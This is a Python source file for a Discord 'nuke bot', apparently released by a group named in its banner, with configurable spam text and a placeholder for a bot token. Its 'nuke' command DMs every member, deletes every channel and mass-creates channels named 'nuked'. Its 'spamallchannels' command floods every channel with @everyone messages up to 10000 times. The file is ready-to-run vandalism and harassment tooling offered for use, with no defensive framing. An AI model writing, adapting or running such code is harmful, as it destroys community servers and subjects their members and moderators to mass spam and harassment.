print("Loading imports...")
import discord
from discord import Webhook, AsyncWebhookAdapter
import aiohttp
from discord.ext import commands
from discord.ext.commands import *
from discord import Permissions
import asyncio
import random
from random import randint
import colorama
from colorama import Fore, Style
##SETTINGS [ MANDATORY READ THIS ]

bot_token = "" ##Between the "" put the bot token. https://www.writebots.com/discord-bot-token/#:~:text=%20Generating%20Your%20Token%20Step-by-Step%20%201%20Go,screen%20and%20click%20%E2%80%9CBot%E2%80%9D.%20It%E2%80%99s%20the...%20More%20

nuke_channel_names = ["nuked","poop server"] ##Put in between "" whatever you want the bot to mass create channels.

message_spam_context = ["@everyone nuked by unbidden lmao","@everyone rekt"] ##Put whatever you want the bot to spam. If you want it to spam more things, do it like "poop","rekt"

bot_prefix = '!' ##Bot Prefix

playing_status = "Hi!" ##Whatever you want your bot to show up in their playing satus.

dm_context = "get rekt" ##change it to whatever you want the nukebot to dm spam

amount_of_spam = 10000 ##How many messages do you want it to spam in total?

##CODE BELOW,DO NOT EDIT ANYTHING UNLESS YOU KNOW WHAT YOUR DOING.
print("Getting Prefix")
bot = commands.Bot(command_prefix = '!')
bot.remove_command(name = 'help')


print("Getting the bot online..")
@bot.event
async def on_ready():
     await bot.change_presence(activity=discord.Game(name=playing_status)) 
     print("Bot is online.")
     
#

@bot.event
async def on_connect():
     print(f"""
       _    _       _     _     _     _              _   _       _        _           _   
 | |  | |     | |   (_)   | |   | |            | \ | |     | |      | |         | |  
 | |  | |_ __ | |__  _  __| | __| | ___ _ __   |  \| |_   _| | _____| |__   ___ | |_ 
 | |  | | '_ \| '_ \| |/ _` |/ _` |/ _ \ '_ \  | . ` | | | | |/ / _ \ '_ \ / _ \| __|
 | |__| | | | | |_) | | (_| | (_| |  __/ | | | | |\  | |_| |   <  __/ |_) | (_) | |_ 
  \____/|_| |_|_.__/|_|\__,_|\__,_|\___|_| |_| |_| \_|\__,_|_|\_\___|_.__/ \___/ \__|   
                                             Please give credit if your using this.
                                                 Property of Pathos-II's Anti Countryhuman group known as: Neo unbidden 
                                                     Be sure to change the settings above. 
                                                         Token is mandatory.
                                                         
                     Commands: nuke   |   spamallchannels""")
                                                         
#


@bot.command()
async def nuke(ctx, amount=500):  
     await ctx.message.delete()
     guild = ctx.guild      
     for user in ctx.guild.members:
         try:
             await user.send(dm_context)
         except:
             pass
     for channel in guild.channels:
         try:
             await channel.delete()
         except:
             pass
     for i in range(amount):
             await guild.create_text_channel(random.choice(nuke_channel_names))

        


@bot.command()
async def spamallchannels(ctx, amount=amount_of_spam):
         for _ in range(amount):
             for channel in ctx.guild.text_channels:
                 await channel.send(random.choice(message_spam_context))




        
#
bot.run(bot_token)